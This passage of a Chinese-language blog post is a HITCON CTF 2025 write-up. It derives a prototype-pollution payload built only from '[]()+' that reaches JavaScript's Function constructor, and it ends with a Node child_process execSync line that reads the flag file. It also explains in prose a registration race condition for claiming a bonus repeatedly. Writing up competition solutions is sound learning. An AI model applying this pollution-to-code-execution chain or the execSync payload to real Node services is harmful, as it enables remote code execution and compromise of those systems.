language_">console</span>.<span class="title function_">log</span>(e)</span><br><span class="line">                <span class="keyword">return</span> <span class="string">"???"</span></span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">    });</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">clone</span> = (<span class="params">target, result = {}</span>) =&gt; {</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">const</span> [key, value] <span class="keyword">of</span> <span class="title class_">Object</span>.<span class="title function_">entries</span>(target)) {</span><br><span class="line">        <span class="comment">/* What is the point of number key? */</span></span><br><span class="line">        <span class="keyword">if</span> (key.<span class="title function_">toString</span>().<span class="title function_">match</span>(<span class="regexp">/\d/</span>)) <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> (value &amp;&amp; <span class="keyword">typeof</span> value == <span class="string">"object"</span>) {</span><br><span class="line">            <span class="keyword">if</span> (!(key <span class="keyword">in</span> result)) result[key] = {};</span><br><span class="line">            <span class="title function_">clone</span>(value, result[key]);</span><br><span class="line">        } <span class="keyword">else</span> {</span><br><span class="line">            result[key] = value;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">};</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">"/render"</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> {</span><br><span class="line">    <span class="keyword">let</span> template = req.<span class="property">body</span>.<span class="property">template</span> ?? <span class="string">""</span></span><br><span class="line">    <span class="keyword">let</span> context = {}</span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">body</span>.<span class="property">context</span>)</span><br><span class="line">        context = <span class="title function_">clone</span>(<span class="title class_">JSON</span>.<span class="title function_">parse</span>(req.<span class="property">body</span>.<span class="property">context</span>))</span><br><span class="line"></span><br><span class="line">    res.<span class="title function_">send</span>(<span class="title function_">renderTemplate</span>(template, context))</span><br><span class="line">})</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">"/"</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> {</span><br><span class="line">    res.<span class="title function_">sendFile</span>(<span class="string">"index.html"</span>, { <span class="attr">root</span>: __dirname })</span><br><span class="line">})</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">48763</span>, <span class="function">() =&gt;</span> {</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">"servert started"</span>);</span><br><span class="line">})</span><br></pre></td></tr></table></figure></div>
+
+<p>這邊的解法如下，目標是任意執行 JavaScript。所以打算先拿到 JavaScript 的 <code>Function</code>（funciton constructor）</p>
+<p>先用 <code>[]</code> 拿到陣列</p>
+<div class="code-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[]</span><br></pre></td></tr></table></figure></div>
+
+<p>接著拿到陣列的空字串屬性 <code>[]['']</code></p>
+<div class="code-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[][[]]</span><br></pre></td></tr></table></figure></div>
+
+<p>可以來看看上面的為什麼會等價於 <code>[]['']</code>。</p>
+<p><code>a[b]</code> 相當於 <code>a[ToPropertyKey(b)]</code>。所以 <code>[][[]]</code> 相當於 <code>[][ToPropertyKey([])]</code>。而 <code>ToPropertyKey([])</code> 是 <code>''</code> 空字串。所以我們現在可以存取 陣列的空字串屬性了（只用 <code>[]</code> 這兩個字元）</p>
+<p>記得我們還有 prototype pollution 可以使用，可以把 空字串屬性，污染成我們想要的東西。我們可以這樣污染空字串屬性</p>
+<div class="code-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">{<span class="string">"__proto__"</span>:{<span class="string">""</span>:<span class="string">"constructor"</span>}}</span><br></pre></td></tr></table></figure></div>
+
+<p>這樣會有這種效果，可以拿到 `’constructor’</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; [][[]]</span><br><span class="line">'constructor'</span><br></pre></td></tr></table></figure></div>
+
+<p>拿到 `’constructor’ 字串，就表示我們可以來拿 陣列 的 constructor，也就是可以造出陣列的函數。</p>
+<div class="code-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; [][<span class="string">'constructor'</span>]</span><br><span class="line">ƒ <span class="title class_">Array</span>() { [native code] }</span><br></pre></td></tr></table></figure></div>
+
+<p>而可以造出陣列函數的東西，是個函數。那函數的 constructor 是什麼呢，當然就是能造出函式的 function constructor 了</p>
+<div class="code-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; [][<span class="string">'constructor'</span>][<span class="string">'constructor'</span>]</span><br><span class="line">ƒ <span class="title class_">Function</span>() { [native code] }</span><br></pre></td></tr></table></figure></div>
+
+<p>拿到 <code>Function</code> 能做什麼呢，可以拿來從字串造出 函數，比如</p>
+<div class="code-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="title class_">Function</span>(<span class="string">'console.log("ching")'</span>)</span><br><span class="line">ƒ <span class="title function_">anonymous</span>(<span class="params"></span></span><br><span class="line"><span class="params"></span>) {</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">"ching"</span>)</span><br><span class="line">}</span><br></pre></td></tr></table></figure></div>
+
+<p>所以只要呼叫這個造出來的函式，就會執行函式裡面的程式碼</p>
+<div class="code-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="title class_">Function</span>(<span class="string">'console.log("ching")'</span>)()</span><br><span class="line">ching</span><br><span class="line"><span class="literal">undefined</span></span><br></pre></td></tr></table></figure></div>
+
+<p>總結一下，目前用了 <code>[]()</code>，可以造出 Function，並執行起來。只是我們還需要 function body。</p>
+<p>我們可以把 <code>Function</code> 加上 <code>[]</code>，取得字串 <code>'function Function() { [native code] }'</code>。</p>
+<blockquote>
+<p><code>a + b</code> 在 <code>ToPrimitive(a)</code> 或 <code>ToPrimitive(b)</code> 其中一個是字串時，等於 <code>ToString(a)+ToString(b)</code></p>
+</blockquote>
+<div class="code-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="title class_">Function</span> + []</span><br><span class="line"><span class="string">'function Function() { [native code] }'</span></span><br></pre></td></tr></table></figure></div>
+
+<p>我們可以把 <code>'function Function() { [native code] }'</code> 屬性值污染成 <code>"console.log('ching')"</code></p>
+<div class="code-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">{</span><span class="attr">"__proto__"</span><span class="punctuation">:</span><span class="punctuation">{</span><span class="attr">""</span><span class="punctuation">:</span><span class="string">"constructor"</span><span class="punctuation">,</span> <span class="attr">"function Function() { [native code] }"</span><span class="punctuation">:</span> <span class="string">"console.log('ching')"</span><span class="punctuation">}</span><span class="punctuation">}</span></span><br></pre></td></tr></table></figure></div>
+
+<p>這樣可以得到任意指定字串了</p>
+<div class="code-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; [][<span class="string">"function Function() { [native code] }"</span>]</span><br><span class="line"><span class="string">"console.log('ching')"</span></span><br></pre></td></tr></table></figure></div>
+
+<p>所以把上面那些和在一起，一步一步推出我們的 payload</p>
+<div class="code-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Function</span>(<span class="string">"console.log('ching')"</span>)()</span><br><span class="line"></span><br><span class="line"><span class="comment">// 把 Function 換成 []['constructor']['constructor']</span></span><br><span class="line">[][<span class="string">'constructor'</span>][<span class="string">'constructor'</span>](<span class="string">"console.log('ching')"</span>)()</span><br><span class="line"></span><br><span class="line"><span class="comment">// 把 "console.log('ching')" 換成 []["function Function() { [native code] }"]</span></span><br><span class="line">[][<span class="string">'constructor'</span>][<span class="string">'constructor'</span>]([][<span class="string">"function Function() { [native code] }"</span>])()</span><br><span class="line"></span><br><span class="line"><span class="comment">// 把 'consturctor' 換成 [][[]]</span></span><br><span class="line">[][[][[]]][[][[]]]([][<span class="string">"function Function() { [native code] }"</span>])()</span><br><span class="line"></span><br><span class="line"><span class="comment">// 把 "function Function() { [native code] }" 換成 Function + []</span></span><br><span class="line">[][[][[]]][[][[]]]([][<span class="title class_">Function</span>+[]])()</span><br><span class="line"></span><br><span class="line"><span class="comment">// 把 Function 換成 []['constructor']['constructor']</span></span><br><span class="line">[][[][[]]][[][[]]]([][[][<span class="string">'constructor'</span>][<span class="string">'constructor'</span>]+[]])()</span><br><span class="line"></span><br><span class="line"><span class="comment">// 把 'constructor' 換成 [][[]]</span></span><br><span class="line">[][[][[]]][[][[]]]([][[][[][[]]][[][[]]]+[]])()</span><br></pre></td></tr></table></figure></div>
+
+<p>可以看到，只需要 <code>[]()+</code> 就可以任意執行程式碼了。這邊使用這個 payload 來讀 flag，可以拿到回顯。</p>
+<div class="code-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">global</span>.<span class="property">process</span>.<span class="property">mainModule</span>.<span class="property">constructor</span>.<span class="title function_">_load</span>(<span class="string">'child_process'</span>).<span class="title function_">execSync</span>(<span class="string">'cat+/fl*'</span>).<span class="title function_">toString</span>()</span><br></pre></td></tr></table></figure></div>
+
+<h4 id="web-Daemon-Slayer"><a href="#web-Daemon-Slayer" class="headerlink" title="[web] Daemon Slayer"></a>[web] Daemon Slayer</h4><p>題目基本上拿到夠多錢就能買 flag，而題目的註冊帳號的流程如下</p>
+<ol>
+<li>檢查使用者是否存在</li>
+<li>註冊使用者帳戶</li>
+<li>給使用者初始禮金</li>
+</ol>
+<p>這些步驟沒有 atomic，表示可以 race 多次來領取很多初始禮金。具體如下：</p>
+<p>一次同時註冊很多個相同 username 的帳戶即可。</p>
+<p>在上面三個步驟中，只要還沒有任何 request 跑到 步驟 3，步驟 1 的檢查一定會過。所以只要有多個 request 成功通過 步驟 1，就可以重複領取初始禮金。可以拿到足夠的錢買 flag。</p>
+<p>可以透過 BurpSuite 的 <a class="link" target="_blank" rel="noopener" href="https://portswigger.net/burp/documentation/desktop/tools/repeater/send-group">last-byte synchronization<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 來穩定同時送出多個請求，不過這邊用 python 開多 thread 就夠了。</p>
+
+		</div>
+
+		
+		<div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
+			<div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> HITCON CTF 2025</li>
+        <li><strong>Author:</strong> Ching367436</li>
+        <li><strong>Created at
+                :</strong> 2025-10-20 11:45:50</li>
+        
+        <li>
+            <strong>Link:</strong> https://blog.ching367436.me/hitcon-ctf-2025/
+        </li>
+        <li>
+            <strong>
+                License:
+            </strong>
+            
+
+            
+                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
+            
+        </li>
+    </ul>
+</div>
+
+		</div>
+		
+
+		
+		<ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/template-engine/">#template-engine</a>&nbsp;
+			</li>
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/HITCON/">#HITCON</a>&nbsp;
+			</li>
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/CTF/">#CTF</a>&nbsp;
+			</li>
+			
+		</ul>
+		
+
+		
+  <div class="recommended-article px-2 sm:px-6 md:px-8">
+   <div class="recommended-desktop">
+    <div class="recommended-article-header text-xl md:text-3xl font-bold mt-10">
+     <i aria-hidden="true"></i><span>推薦閱讀</span>
+    </div>
+    <div class="recommended-article-group"><a class="recommended-article-item" href="/ais3-eof-2024-final/" title="AIS3 EOF 2024 Final" rel="bookmark">
+  <img src="/ais3-eof-2024-final/TakeKitsune.webp" alt="AIS3 EOF 2024 Final" class="!max-w-none">
+  <span class="title">AIS3 EOF 2024 Final</span>
+</a><a class="recommended-article-item" href="/ais3-2022-%E6%9C%80%E4%BD%B3%E5%B0%88%E9%A1%8C/" title="AIS3 2022 最佳專題" rel="bookmark">
+  <img src="/ais3-2022-最佳專題/ais3-flag.webp" alt="AIS3 2022 最佳專題" class="!max-w-none">
+  <span class="title">AIS3 2022 最佳專題</span>
+</a><a class="recommended-article-item" href="/ais3-2021-%E6%9C%80%E4%BD%B3%E5%B0%88%E9%A1%8C/" title="AIS3 2021 最佳專題" rel="bookmark">
+  <img src="/ais3-2021-最佳專題/Leukocyte-Lab.png" alt="AIS3 2021 最佳專題" class="!max-w-none">
+  <span class="title">AIS3 2021 最佳專題</span>
+</a></div>
+   </div>
+   <div class="recommended-mobile">
+   <div class="recommended-article-header text-xl md:text-3xl font-bold mt-10">
+     <i aria-hidden="true"></i><span>推薦閱讀</span>
+   </div>
+   <div class="recommended-article-group"><a class="recommended-article-item" href="/ais3-eof-2024-final/" title="AIS3 EOF 2024 Final" rel="bookmark">
+  <img src="/ais3-eof-2024-final/TakeKitsune.webp" alt="AIS3 EOF 2024 Final" class="!max-w-none">
+  <span class="title">AIS3 EOF 2024 Final</span>
+</a><a class="recommended-article-item" href="/ais3-2022-%E6%9C%80%E4%BD%B3%E5%B0%88%E9%A1%8C/" title="AIS3 2022 最佳專題" rel="bookmark">
+  <img src="/ais3-2022-最佳專題/ais3-flag.webp" alt="AIS3 2022 最佳專題" class="!max-w-none">
+  <span class="title">AIS3 2022 最佳專題</span>
+</a></div>
+   </div>
+  </div>
+
+		
+		<div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+			
+			
+			<div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+				<a class="next" rel="next" href="/hitcon-ctf-2025-maximal-extractable-vuln/">
+					<span class="title flex justify-center items-center">
+						<span class="post-nav-title-item truncate max-w-48">HITCON CTF 2025 - Maximal Extractable Vuln</span>
+						<span class="post-nav-item">Next posts</span>
+					</span>
+					<span class="right arrow-icon flex justify-center items-center">
+						<i class="fa-solid fa-chevron-right"></i>
+					</span>
+				</a>
+			</div>
+			
+		</div>
+		
+
+
+		
+		<div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
+			<div class="comments-container mt-10 w-full ">
+    <div id="comment-anchor" class="w-full h-2.5"></div>
+    <div class="comment-area-title w-full my-1.5 md:my-2.5 text-xl md:text-3xl font-bold">
+        Comments
+    </div>
+    
+
+        
+            
+    <div id="giscus-container"></div>
+    <script data-swup-reload-script defer>
+        async function loadGiscus() {
+            const giscusConfig = {
+                'src': 'https://giscus.app/client.js',
+                'data-repo': 'Ching367436/blog',
+                'data-repo-id': 'R_kgDOJNMXOw',
+                'data-category': 'Giscus',
+                'data-category-id': 'DIC_kwDOJNMXO84CVeVB',
+                'data-mapping': 'title',
+                'data-strict': '0',
+                'data-reactions-enabled': '1',
+                'data-emit-metadata': '1',
+                'data-theme': 'preferred_color_scheme',
+                'data-lang': 'en',
+                'data-input-position': 'bottom',
+                'data-loading': 'lazy',
+                'crossorigin': 'anonymous',
+                'async': true
+            }
+            const giscusScript = document.createElement('script');
+            for (const key in giscusConfig) {
+                giscusScript.setAttribute(key, giscusConfig[key]);
+            }
+            document.getElementById('giscus-container').appendChild(giscusScript);
+        }
+        if ('true') {
+            let loadGiscusTimeout = setTimeout(() => {
+                loadGiscus();
+                clearTimeout(loadGiscusTimeout);
+            }, 1000);
+        } else {
+            document.addEventListener('DOMContentLoaded', loadGiscus);
+        }
+    </script>
+
+
+        
+        
+    
+</div>
+
+		</div>
+		
+	</div>
+
+	
+	<div class="toc-content-container">
+		<div class="post-toc-wrap">
+	<div class="post-toc">
+		<div class="toc-title">On this page</div>
+		<div class="page-title">HITCON CTF 2025</div>
+		<ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%A4%E6%B5%81%E8%B3%BD"><span class="nav-text">交流賽</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Belluminar"><span class="nav-text">Belluminar</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Jeopardy"><span class="nav-text">Jeopardy</span></a></li></ol></li></ol>
+
+	</div>
+</div>
+	</div>
+	
+</div>
+			</div>
+
+			
+		</div>
+
+		<div class="main-content-footer">
+			<footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2023</span>
+              -
+            
+            2026&nbsp;&nbsp;<i class="fa-solid fa-heart" style="color: #f54545"></i>&nbsp;&nbsp;<a href="/">Ching367436</a>
+            
+                
+                <p class="post-count space-x-0.5">
+                    <span>
+                        14 posts in total
+                    </span>
+                    
+                        <span>
+                            34.9k words in total
+                        </span>
+                    
+                </p>
+            
+        </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
+            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.8.5</a></span>
+        </div>
+        
+        
+            <div>
+                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
+            </div>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+            
+                
+        
+                
+        
+        
+    </div>  
+</footer>
+		</div>
+	</div>
+
+	
+	<div class="post-tools">
+		<div class="post-tools-container">
+	<ul class="article-tools-list">
+		<!-- TOC aside toggle -->
+		
+		<li class="right-bottom-tools page-aside-toggle">
+			<i class="fa-regular fa-outdent"></i>
+		</li>
+		
+
+		<!-- go comment -->
+		
+		<li class="go-comment">
+			<i class="fa-regular fa-comments"></i>
+		</li>
+		
+	</ul>
+</div>
+	</div>
+	
+
+	<div class="right-side-tools-container">
+		<div class="side-tools-container">
+	<ul class="hidden-tools-list">
+		<li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-plus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-minus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+			<i class="fa-regular fa-moon"></i>
+		</li>
+
+		<!-- rss -->
+		
+		<li class="right-bottom-tools rss flex justify-center items-center">
+			<a class="flex justify-center items-center" href="/atom.xml" target="_blank">
+				<i class="fa-regular fa-rss"></i>
+			</a>
+		</li>
+		
+
+		
+		<li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+			<i class="fa-regular fa-arrow-up"></i>
+		</li>
+		
+
+		<li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+			<i class="fa-regular fa-arrow-down"></i>
+		</li>
+	</ul>
+
+	<ul class="visible-tools-list">
+		<li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+			<i class="fa-regular fa-cog fa-spin"></i>
+		</li>
+		
+		
+	</ul>
+</div>
+	</div>
+
+	<div class="image-viewer-container">
+	<img src="">
+</div>
+
+	
+
+</main>
+
+
+
+<script src="/js/build/libs/Swup.min.js"></script>
+
+<script src="/js/build/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/build/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+	
+<script src="/js/build/tools/imageViewer.js" type="module"></script>
+
+<script src="/js/build/utils.js" type="module"></script>
+
+<script src="/js/build/main.js" type="module"></script>
+
+<script src="/js/build/layouts/navbarShrink.js" type="module"></script>
+
+<script src="/js/build/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/js/build/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/js/build/layouts/categoryList.js" type="module"></script>
+
+
+
+
+
+    
+<script src="/js/build/tools/codeBlock.js" type="module"></script>
+
+
+
+
+
+
+    
+<script src="/js/build/tools/runtime.js"></script>
+
+    
+<script src="/js/build/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+  
+<script src="/js/build/libs/Typed.min.js"></script>
+
+  
+<script src="/js/build/plugins/typed.js" type="module"></script>
+
+
+
+
+
+
+
+
+    
+<script src="/js/build/libs/anime.min.js"></script>
+
+
+
+
+
+    
+<script src="/js/build/tools/tocToggle.js" type="module" data-swup-reload-script=""></script>
+
+<script src="/js/build/layouts/toc.js" type="module" data-swup-reload-script=""></script>
+
+<script src="/js/build/plugins/tabs.js" type="module" data-swup-reload-script=""></script>
+
+
+
+
+<script src="/js/build/libs/moment-with-locales.min.js" data-swup-reload-script=""></script>
+
+
+<script src="/js/build/layouts/essays.js" type="module" data-swup-reload-script=""></script>
+
+
+
+
+
+	
+</body>
+
+</html>
